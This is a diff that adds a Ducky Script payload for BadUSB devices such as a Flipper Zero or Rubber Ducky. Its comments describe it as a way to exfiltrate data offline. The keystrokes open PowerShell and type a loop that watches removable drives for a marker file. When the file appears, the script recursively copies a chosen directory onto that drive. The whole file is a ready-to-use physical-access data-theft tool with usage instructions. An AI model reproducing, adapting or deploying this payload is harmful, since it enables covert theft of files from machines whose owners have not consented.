@@ -1,0 +1,79 @@
+REM                                                                    _..._       .-'''-.                 .-'''-.
+REM                                                                 .-'_..._''.   '   _    \  .---.       '   _    \
+REM /|                                                            .' .'      '.\/   /` '.   \ |   |.--. /   /` '.   \
+REM ||    .-.          .-                                        / .'          .   |     \  ' |   ||__|.   |     \  '
+REM ||     \ \        / /                               .-,.--. . '            |   '      |  '|   |.--.|   '      |  '
+REM ||  __  \ \      / /                          __    |  .-. || |            \    \     / / |   ||  |\    \     / /
+REM ||/'__ '.\ \    / /            .--------.  .:--.'.  | |  | || |             `.   ` ..' /  |   ||  | `.   ` ..' /
+REM |:/`  '. '\ \  / /             |____    | / |   \ | | |  | |. '                '-...-'`   |   ||  |    '-...-'`
+REM ||     | | \ `  /                  /   /  `" __ | | | |  '-  \ '.          .              |   ||  |
+REM ||\    / '  \  /                 .'   /    .'.''| | | |       '. `._____.-'/              |   ||__|
+REM |/\'..' /   / /                 /    /___ / /   | |_| |         `-.______ /               '---'
+REM '  `'-'`|`-' /                 |         |\ \._,\ '/|_|                  `
+REM          '..'                  |_________| `--'  `"
+
+REM Do you want BadUSB / Ducky Script to exfill data from a machine but not online?
+REM This script tests all removable drive root directories for a certain file with a random file name.
+REM IF this file is detected, this means this drive is the removable you're using to exfill data to.
+REM How to use this script?
+REM Copy this Ducky script to your Flipper Zero or Rubber Ducky, generate a file with a random file name
+REM and change the value of $MaxDuration, $CopyFrom, $CopyTo and $FindMe below accordingly.
+
+DELAY 1000
+GUI r
+DELAY 1000
+ALTSTRING powershell
+ENTER
+DELAY 2000
+ALTSTRING $MaxDuration = 20
+ENTER
+ALTSTRING $CopyFrom = "C:\Windows"
+ENTER
+ALTSTRING $CopyTo = "copy"
+ENTER
+ALTSTRING $FindMe = "gfhnubkw.txt"
+ENTER
+ALTSTRING $f = $false
+ENTER
+ALTSTRING $startTime = Get-Date
+ENTER
+ALTSTRING while ((New-TimeSpan -Start $startTime).TotalSeconds -lt $MaxDuration -and -not $f) {
+ENTER
+ALTSTRING $d = Get-WmiObject -Class Win32_Volume | Where-Object { $_.DriveType -eq 2 }
+ENTER
+ALTSTRING foreach ($e in $d) {
+ENTER
+ALTSTRING $p = Join-Path -Path $e.Name -ChildPath $FindMe
+ENTER
+ALTSTRING if (Test-Path $p) {
+ENTER
+ALTSTRING $f = $true
+ENTER
+ALTSTRING $partition = Get-Partition | Where-Object { $_.DriveLetter -eq $e.DriveLetter }
+ENTER
+ALTSTRING $totalSize = 0
+ENTER
+ALTSTRING $files = Get-ChildItem $CopyFrom -File -Recurse -ErrorAction SilentlyContinue
+ENTER
+ALTSTRING foreach ($file in $files) {
+ENTER
+ALTSTRING $totalSize += $file.Length}
+ENTER
+ALTSTRING if ($totalSize -lt 1GB) {
+ENTER
+ALTSTRING $totalSizeFormatted = "$([Math]::Round($totalSize / 1MB, 1)) MB"}
+ENTER
+ALTSTRING else {
+ENTER
+ALTSTRING $totalSizeFormatted = "$([Math]::Round($totalSize / 1GB, 1)) GB"}
+ENTER
+ALTSTRING Write-Host "Copying... $totalSizeFormatted to $($e.DriveLetter)"
+ENTER
+ALTSTRING $Destination = "$($e.Name)\$CopyTo"
+ENTER
+ALTSTRING Copy-Item -Path $CopyFrom -Destination $Destination -Recurse -ErrorAction SilentlyContinue
+ENTER
+ALTSTRING Exit}
+ENTER
+ALTSTRING break}}
+ENTER
